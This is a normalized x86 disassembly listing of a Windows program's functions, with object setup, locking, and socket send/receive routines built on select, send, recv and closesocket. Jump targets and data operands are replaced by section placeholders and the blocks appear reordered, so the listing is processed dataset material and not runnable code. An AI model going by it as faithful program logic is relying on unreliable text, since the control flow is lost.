mov [ ebp - 0x4 ] 0x1
call sub_416ff0
push [ ebp + 0x18 ]
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x14 ]
and [ esi + 0x38 ] 0x0
or [ esi + 0x3c ] 0xffffffff
and [ esi + 0x40 ] 0x0
and [ esi + 0x44 ] 0x0
mov [ esi + 0x48 ] 0x400
mov [ esi + 0x4c ] 0x1
call sub_4100cf
mov eax esi
call sub_425e4c
retn 0x14
sub_4100cf
push 0x1c
mov eax sub_43c2f7
call sub_425dad
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
push eax
call sub_418ff0
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push eax
lea ecx [ esi + 0xc ]
call sub_40400a
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
mov eax [ ebp + 0xc ]
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x48 ]
inc eax
push 0x1
push eax
call sub_424ac4
pop ecx
pop ecx
mov [ esi + 0x38 ] eax
call sub_425e4c
retn 0x8
sub_410125
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4102c6
push [ esi + 0x38 ]
call sub_424869
and [ esi + 0x38 ] 0x0
pop ecx
lea eax [ esi + 0x34 ]
call sub_417010
lea eax [ esi + 0x30 ]
call sub_417010
mov ecx esi
pop esi
jmp sub_40fa96
sub_410173
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x10c
push esi
mov esi [ eax + 0x3c ]
test esi esi
jge r-xdata
mov eax ecx
push ebx
cdq
mov ebx 0xf4240
idiv ebx
inc ecx
neg ecx
sbb ecx ecx
mov [ ebp - 0x108 ] esi
mov [ ebp - 0x10c ] 0x1
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
and ecx eax
push ecx
push 0x0
push 0x0
lea eax [ ebp - 0x10c ]
push eax
inc esi
push esi
mov [ ebp - 0x4 ] edx
call select
pop ebx
test eax eax
jle r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
lea eax [ ebp - 0x10c ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x3c ]
call __WSAFDIsSet
test eax eax
je r-xdata
pop esi
leave
retn 0x4
xor eax eax
inc eax
jmp r-xdata
sub_4101f0
push esi
mov esi ecx
cmp [ esi + 0x3c ] 0x0
jl r-xdata
push 0x12
pop eax
xor eax eax
test eax eax
jne r-xdata
mov eax [ esi ]
push 0xa
mov ecx esi
call [ eax + 0x8 ]
test eax eax
je r-xdata
pop esi
retn
cmp [ esi + 0x4c ] 0x0
jne r-xdata
sub_410217
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
push [ esi + 0x30 ]
call [ EnterCriticalSection@IAT ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x14 ]
xor edi edi
mov [ ebp - 0x4 ] eax
cmp eax edi
je r-xdata
push [ esi + 0x30 ]
call [ LeaveCriticalSection@IAT ]
xor al al
cmp [ esi + 0x3c ] edi
jl r-xdata
mov [ ebp + 0x8 ] edi
mov eax [ ebx + 0x14 ]
push [ esi + 0x30 ]
add [ esi + 0x44 ] eax
call [ LeaveCriticalSection@IAT ]
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0xffffffff
setne al
jmp r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ecx ]
push 0x7
push esi
call [ eax + 0xc ]
cmp edi [ ebp - 0x4 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
push 0x0
sub ecx edi
push ecx
add eax edi
push eax
push [ esi + 0x3c ]
call send
add edi eax
mov [ ebp + 0x8 ] eax
cmp eax 0xffffffff
jne r-xdata
sub_4102c6
push esi
mov esi ecx
mov eax [ esi + 0x3c ]
push edi
test eax eax
jl r-xdata
push [ esi + 0x30 ]
mov edi [ EnterCriticalSection@IAT ]
call edi
push [ esi + 0x34 ]
call edi
and [ esi + 0x8 ] 0x0
and [ esi + 0x40 ] 0x0
and [ esi + 0x44 ] 0x0
mov edi [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4c ] 0x1
push [ esi + 0x34 ]
call edi
push [ esi + 0x30 ]
call edi
pop edi
pop esi
retn
push eax
call closesocket
or [ esi + 0x3c ] 0xffffffff
sub_410351
push 0x4
mov eax sub_43f4b1
call sub_425dad
mov esi ecx
push 0x50
call sub_4246c6
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push [ esi + 0x28 ]
lea ecx [ esi + 0xc ]
push ecx
push [ esi + 0x2c ]
push [ esi + 0x4 ]
mov esi eax
call sub_410330
jmp r-xdata
call sub_425e4c
retn
sub_410390
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43ece4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push [ esi + 0x30 ]
call [ EnterCriticalSection@IAT ]
xor eax eax
cmp [ esi + 0x4 ] eax
je r-xdata
push [ esi + 0x30 ]
call [ LeaveCriticalSection@IAT ]
push 0x12
pop eax
cmp [ esi + 0x3c ] eax
jge r-xdata
cmp [ esi + 0x8 ] eax
jle r-xdata
push [ esi + 0x2c ]
xor edi edi
inc edi
cmp [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x8 ] edi
lea ebx [ esi + 0xc ]
jne r-xdata
push [ esi + 0x30 ]
call [ LeaveCriticalSection@IAT ]
movzx eax [ esi + 0x28 ]
push eax
mov ecx ebx
call sub_4138d7
push ebx
call sub_4137b2
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x4 ]
mov [ esi + 0x8 ] 0x2
mov [ esi + 0x4c ] 0x0
mov eax [ ecx ]
push esi
call [ eax + 0x8 ]
jmp r-xdata
cmp eax 0xfffffff6
je r-xdata
pop ecx
pop ecx
push [ esi + 0x30 ]
mov [ esi + 0x3c ] eax
call [ LeaveCriticalSection@IAT ]
mov eax [ esi + 0x3c ]
test eax eax
jge r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ esp + 0x4c ]
push ebx
push eax
call sub_40f9cf
add esp 0xc
push eax
push 0x100
mov [ esp + 0x78 ] edi
mov ebx [ esi + 0x2c ]
push 0x2
call sub_4149f1
lea ecx [ esp + 0x48 ]
cmp eax 0xfffffff7
je r-xdata
push r--data
lea eax [ esp + 0x30 ]
push ebx
push eax
call sub_40f9cf
add esp 0xc
and [ esp + 0x70 ] 0x0
mov ebx [ esi + 0x2c ]
push eax
push 0x100
push 0x2
call sub_4149f1
lea ecx [ esp + 0x2c ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x14 ]
call sub_403dc1
push 0x2
pop eax
lea ecx [ esp + 0x10 ]
push ecx
push 0x100
mov [ esp + 0x78 ] eax
mov ebx [ esi + 0x2c ]
push eax
call sub_4149f1
lea ecx [ esp + 0x10 ]
jmp r-xdata
or [ esp + 0x70 ] 0xffffffff
push 0x0
push edi
call sub_40415f
mov edx [ esi + 0x3c ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx ]
neg edx
push edx
push esi
call [ eax + 0xc ]
mov eax [ esi + 0x3c ]
neg eax
jmp r-xdata
sub_41051b
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov edi ecx
push [ edi + 0x34 ]
call [ EnterCriticalSection@IAT ]
xor ebx ebx
cmp [ edi + 0x4c ] bl
jne r-xdata
push [ edi + 0x34 ]
call [ LeaveCriticalSection@IAT ]
push 0x12
pop eax
cmp [ edi + 0x3c ] ebx
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
call sub_410173
test al al
jne r-xdata
push ebx
push [ edi + 0x48 ]
push [ edi + 0x38 ]
push [ edi + 0x3c ]
call recv
mov esi eax
cmp esi ebx
jle r-xdata
push [ edi + 0x34 ]
call [ LeaveCriticalSection@IAT ]
push [ edi + 0x34 ]
call [ LeaveCriticalSection@IAT ]
cmp esi ebx
jg r-xdata
add [ edi + 0x40 ] esi
call sub_425e4c
retn 0x4
mov eax [ edi + 0x38 ]
mov [ esi + eax ] bl
cmp [ edi + 0x4 ] ebx
je r-xdata
mov ecx [ edi + 0x4 ]
xor eax eax
cmp esi ebx
setne al
lea eax [ eax * 4 + 0x3 ]
mov esi eax
cmp ecx ebx
je r-xdata
xor eax eax
jmp r-xdata
push esi
push [ edi + 0x38 ]
lea esi [ ebp - 0x28 ]
call sub_409c3d
mov [ ebp - 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
push eax
push edi
call [ edx + 0x4 ]
push ebx
push 0x1
mov ecx esi
call sub_40415f
jmp r-xdata
mov eax esi
jmp r-xdata
mov eax [ ecx ]
push esi
push edi
call [ eax + 0xc ]
sub_4105ee
push 0x0
mov eax sub_43a9c1
call sub_425dad
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov ecx esi
call sub_403de3
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1c ]
call sub_403de3
mov eax esi
call sub_425e4c
retn 0xc
sub_410660
push 0x104
mov eax sub_43d985
call sub_425dad
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
mov [ ebx + 0x4 ] 0x40
and [ ebp - 0x4 ] 0x0
lea edi [ ebx + 0x8 ]
mov [ ebx ] r--data
call sub_404957
lea esi [ ebx + 0xb0 ]
call sub_403dae
lea esi [ ebx + 0xcc ]
call sub_403dae
mov esi [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x4 ] 0x3
mov [ ebx + 0xe8 ] 0x0
cmp esi edi
je r-xdata
mov [ ebp + 0xf ] 0x1
mov eax [ esi ]
mov ecx esi
call [ eax + 0x28 ]
push r--data
call sub_40563c
pop ecx
test al al
je r-xdata
test [ ebp - 0x14 ] 0x2
je r-xdata
and [ ebp - 0x14 ] 0xfffffffb
push edi
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp - 0x14 ] 0x1
call [ eax + 0x44 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] 0x3
test [ ebp - 0x14 ] 0x1
je r-xdata
and [ ebp - 0x14 ] 0xfffffffd
push edi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x5
push r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x14 ] 0x3
call sub_403dc1
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp - 0x14 ] 0x7
call [ eax + 0x44 ]
mov [ ebp + 0xf ] 0x0
test al al
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x14 ] 0x4
je r-xdata
mov eax ebx
call sub_425e4c
retn 0x8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x2c ]
push 0xffffffff
push edi
push eax
lea ecx [ ebx + 0xcc ]
call sub_40400a
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x7
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
push 0xffffffff
push edi
push eax
lea ecx [ ebx + 0xb0 ]
mov [ ebp - 0x4 ] 0x8
call sub_40400a
push edi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x3
call sub_40415f
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x9
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x4 ] 0xa
call sub_401152
lea eax [ ebp - 0x110 ]
lea esi [ ebx + 0x8 ]
mov [ ebp - 0x4 ] 0xb
call sub_4049dd
lea esi [ ebp - 0x110 ]
call sub_4011ad
push edi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
mov [ ebx + 0xe8 ] 0x1
sub_410874
push esi
push edi
mov edi ecx
push 0x0
push 0x1
lea ecx [ edi + 0xcc ]
mov [ edi ] r--data
call sub_40415f
push 0x0
push 0x1
lea ecx [ edi + 0xb0 ]
call sub_40415f
lea esi [ edi + 0x8 ]
call sub_4011ad
mov [ edi ] r--data
pop edi
pop esi
retn
sub_4108ad
push 0x78
mov eax sub_43c845
call sub_425dad
mov edi ecx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp [ edi + 0xe8 ] bl
jne r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] 0x1
call sub_403dc1
push ebx
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x3
call sub_41ec78
mov esi eax
jmp r-xdata
call sub_425e4c
retn
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
cmp [ edi + 0x54 ] ebx
je r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
cmp [ edi + 0xc4 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
lea ecx [ edi + 0x94 ]
push ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x6
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
cmp [ edi + 0xe0 ] ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
lea ecx [ edi + 0xb0 ]
push ecx
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x84 ]
call sub_40415f
mov eax esi
mov eax [ esi ]
add edi 0xcc
push edi
mov ecx esi
call [ eax + 0x20 ]
sub_410a29
push 0x4
mov eax sub_43d8c5
call sub_425dad
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0xc ]
lea esi [ edi + 0x8 ]
push 0x4
mov [ edi ] r--data
mov [ edi + 0x4 ] eax
mov [ ebp + 0xc ] esi
call sub_4246c6
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x1
call sub_4093ba
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] 0x2
lea esi [ edi + 0x24 ]
push 0x4
mov [ ebp + 0xc ] esi
call sub_4246c6
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x3
call sub_413499
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
mov [ esi + 0x1c ] ebx
mov [ ebp - 0x4 ] 0x4
lea esi [ edi + 0x44 ]
push 0x4
mov [ ebp + 0xc ] esi
call sub_4246c6
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x5
call sub_4134c3
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x31 ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
mov [ esi + 0x1c ] ebx
mov [ ebp - 0x4 ] 0x6
lea esi [ edi + 0x64 ]
push 0x4
mov [ ebp + 0xc ] esi
call sub_4246c6
pop ecx
cmp eax ebx
je r-xdata
mov eax edi
call sub_425e4c
retn 0x8
mov eax esi
mov esi edi
call sub_40d9a7
mov ecx [ edi + 0x4 ]
mov eax rw-data
call sub_40d9a7
mov ecx [ edi + 0x4 ]
mov eax rw-data
call sub_40d9a7
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x7
call sub_4093ba
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] ebx
lea ebx [ edi + 0x80 ]
push ebx
mov [ ebp - 0x4 ] 0x8
call sub_403eef
lea eax [ edi + 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_404a6d
lea esi [ edi + 0xbc ]
call sub_403dae
lea esi [ edi + 0xd8 ]
call sub_403dae
lea esi [ edi + 0xf4 ]
call sub_403dae
lea esi [ edi + 0x110 ]
call sub_403dae
lea esi [ edi + 0x12c ]
call sub_403dae
push rw-data
mov eax ebx
mov [ ebp - 0x4 ] 0xf
call sub_403f8c
mov esi rw-data
push esi
mov eax ebx
call sub_403f8c
push rw-data
mov eax ebx
call sub_403f8c
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
sub_410bfb
push 0x4
mov eax sub_43d7f0
call sub_425dad
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0xb
mov eax [ edi + 0x4 ]
xor esi esi
cmp eax esi
je r-xdata
push esi
push 0x1
lea ecx [ edi + 0x12c ]
call sub_40415f
push esi
push 0x1
lea ecx [ edi + 0x110 ]
call sub_40415f
push esi
push 0x1
lea ecx [ edi + 0xf4 ]
call sub_40415f
push esi
push 0x1
lea ecx [ edi + 0xd8 ]
call sub_40415f
push esi
push 0x1
lea ecx [ edi + 0xbc ]
call sub_40415f
lea eax [ edi + 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_404bcd
lea eax [ edi + 0x80 ]
call sub_403f2c
lea esi [ edi + 0x64 ]
call sub_40f06d
lea eax [ edi + 0x44 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_412e49
lea eax [ edi + 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_412b14
lea esi [ edi + 0x8 ]
call sub_40f06d
mov [ edi ] r--data
call sub_425e4c
retn
push eax
mov eax rw-data
call sub_40d9c4
push [ edi + 0x4 ]
mov eax rw-data
call sub_40d9c4
push [ edi + 0x4 ]
mov eax rw-data
call sub_40d9c4
mov eax [ edi + 0x4 ]
push edi
call sub_40d922
sub_410ce7
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43d728
mov eax [ fs : 0x0 ]
push eax
sub esp 0x848
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x840 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x858 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x10 ] ebx
mov esi ecx
mov [ esp + 0x24 ] ebx
mov eax [ edi ]
mov ecx edi
mov [ esp + 0x20 ] esi
mov [ esp + 0x1c ] edi
call [ eax + 0x68 ]
dec eax
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x78 ]
mov ecx rw-data
call sub_40561a
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x78 ]
mov ecx rw-data
call sub_40561a
mov esi r--data
test al al
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax ]
mov ecx [ esi + 0x8 ]
mov [ esp + 0x1b ] bl
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] eax
xor al al
jmp r-xdata
mov [ esp + 0x1b ] bl
push esi
lea ecx [ esp + 0x6cc ]
call sub_403dc1
mov [ esp + 0x860 ] 0x19
push esi
lea ecx [ esp + 0x26c ]
mov [ esp + 0x14 ] 0x80
call sub_403dc1
mov [ esp + 0x860 ] 0x1a
push r--data
lea ecx [ esp + 0x544 ]
mov [ esp + 0x14 ] 0x180
call sub_403dc1
lea ecx [ esp + 0x6c8 ]
push ecx
lea ecx [ esp + 0x26c ]
push ecx
lea ecx [ esp + 0x548 ]
mov [ esp + 0x868 ] 0x1b
mov eax [ edi ]
push ecx
mov ecx edi
mov [ esp + 0x1c ] 0x380
call [ eax + 0x50 ]
mov [ esp + 0x1b ] 0x1
test al al
jne r-xdata
xor esi esi
push r--data
lea ecx [ esp + 0x49c ]
call sub_403dc1
mov [ esp + 0x860 ] 0x1
push r--data
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x14 ] 0x1
call sub_403dc1
push ebx
lea eax [ esp + 0x49c ]
push eax
lea eax [ esp + 0xe8 ]
mov [ esp + 0x868 ] 0x2
push eax
push [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x3
call sub_41ec78
mov esi eax
jmp r-xdata
call sub_423d5c
cmp [ esp + 0x28 ] esi
je r-xdata
mov ecx [ esp + 0x858 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x840 ]
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x4
test [ esp + 0x10 ] 0x100
je r-xdata
and [ esp + 0x10 ] 0xfffffdff
push ebx
push 0x1
lea ecx [ esp + 0x548 ]
call sub_40415f
test [ esp + 0x10 ] 0x200
je r-xdata
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x1
je r-xdata
and [ esp + 0x10 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ esp + 0xe8 ]
call sub_40415f
test [ esp + 0x10 ] 0x2
je r-xdata
mov al [ esp + 0x1b ]
jmp r-xdata
lea esi [ esp + 0x28 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push edi
call [ eax + 0x10 ]
test al al
je r-xdata
mov eax [ esp + 0x48 ]
cmp [ esp + 0x2c ] eax
je r-xdata
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x80
je r-xdata
and [ esp + 0x10 ] 0xfffffeff
push ebx
push 0x1
lea ecx [ esp + 0x270 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x11c ]
call sub_403dc1
mov [ esp + 0x860 ] 0x5
mov eax [ esi ]
add eax 0x10
mov [ esp + 0x14 ] eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0x74 ]
push eax
lea eax [ esp + 0x11c ]
push eax
mov eax [ esp + 0x1c ]
mov ecx esi
call [ eax ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x120 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x73c ]
call sub_403dc1
mov eax [ esp + 0x20 ]
mov [ esp + 0x860 ] 0x6
mov eax [ eax + 0x4 ]
call sub_4049ca
mov edx [ esi ]
add eax 0x8c
push eax
lea eax [ esp + 0x73c ]
push eax
mov ecx esi
call [ edx + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x740 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x154 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x7
mov eax [ edi ]
mov ecx edi
call [ eax + 0x6c ]
mov edx [ esi ]
add eax 0x8c
push eax
lea eax [ esp + 0x154 ]
push eax
mov ecx esi
call [ edx + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x158 ]
call sub_40415f
push r--data
lea ecx [ esp + 0x18c ]
call sub_403dc1
push 0x8
pop edi
push r--data
lea ecx [ esp + 0x4d4 ]
mov [ esp + 0x864 ] edi
call sub_403dc1
lea ecx [ esp + 0x188 ]
push ecx
lea ecx [ esp + 0x4d4 ]
mov [ esp + 0x864 ] 0x9
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ esp + 0x4d8 ]
call sub_40415f
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x190 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0xa
cmp eax ebx
je r-xdata
and [ esp + 0x10 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ esp + 0x4a0 ]
call sub_40415f
lea esi [ esp + 0x28 ]
call sub_408d54
mov esi [ esp + 0x20 ]
jmp r-xdata
mov [ esp + 0x1b ] 0x1
cmp [ esp + 0x1b ] bl
je r-xdata
and [ esp + 0x10 ] 0xffffff7f
push ebx
push 0x1
lea ecx [ esp + 0x6d0 ]
call sub_40415f
xor edi edi
push r--data
lea ecx [ esp + 0x1c4 ]
call sub_403dc1
mov [ esp + 0x860 ] 0xb
or [ esp + 0x10 ] 0x4
push r--data
lea ecx [ esp + 0x694 ]
call sub_403dc1
lea eax [ esp + 0x1c0 ]
push eax
lea eax [ esp + 0x694 ]
mov [ esp + 0x864 ] 0xc
or [ esp + 0x14 ] edi
push eax
push [ esp + 0x1c ]
xor bl bl
mov edi esi
call sub_41ed6b
mov edi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x1c ]
mov esi [ esi + 0x8 ]
mov [ esp + 0x48 ] eax
cmp [ esp + 0x28 ] ebx
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x78 ]
mov ecx rw-data
call sub_40561a
test al al
je r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x1c
cmp eax ebx
je r-xdata
or [ esp + 0x860 ] 0xffffffff
test [ esp + 0x10 ] 0x4
je r-xdata
and [ esp + 0x10 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ esp + 0x698 ]
call sub_40415f
test [ esp + 0x10 ] 0x8
je r-xdata
mov [ esp + 0x1b ] bl
push esi
lea ecx [ esp + 0x410 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x55
or [ esp + 0x10 ] 0x1000000
push esi
lea ecx [ esp + 0x3d8 ]
call sub_403dc1
mov [ esp + 0x860 ] 0x56
or [ esp + 0x10 ] 0x2000000
push r--data
lea ecx [ esp + 0x3a0 ]
call sub_403dc1
lea ecx [ esp + 0x40c ]
push ecx
lea ecx [ esp + 0x3d8 ]
push ecx
lea ecx [ esp + 0x3a4 ]
mov [ esp + 0x868 ] 0x57
mov eax [ edi ]
or [ esp + 0x18 ] 0x4000000
push ecx
mov ecx edi
call [ eax + 0x50 ]
mov [ esp + 0x1b ] 0x1
test al al
jne r-xdata
mov [ esp + 0x30 ] ebx
mov esi ebx
push r--data
lea ecx [ esp + 0x57c ]
call sub_403dc1
mov [ esp + 0x860 ] 0x1d
or [ esp + 0x10 ] 0x400
push r--data
lea ecx [ esp + 0x2a4 ]
call sub_403dc1
push ebx
lea eax [ esp + 0x57c ]
push eax
lea eax [ esp + 0x2a8 ]
mov [ esp + 0x868 ] 0x1e
or [ esp + 0x18 ] 0x800
push eax
push [ esp + 0x20 ]
call sub_41ec78
mov esi eax
mov [ esp + 0x30 ] esi
jmp r-xdata
push r--data
lea ecx [ esp + 0x50c ]
call sub_403dc1
push rw-data
lea ecx [ esp + 0x50c ]
mov [ esp + 0x864 ] 0xf
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
or [ esp + 0x860 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x510 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x860 ] 0x10
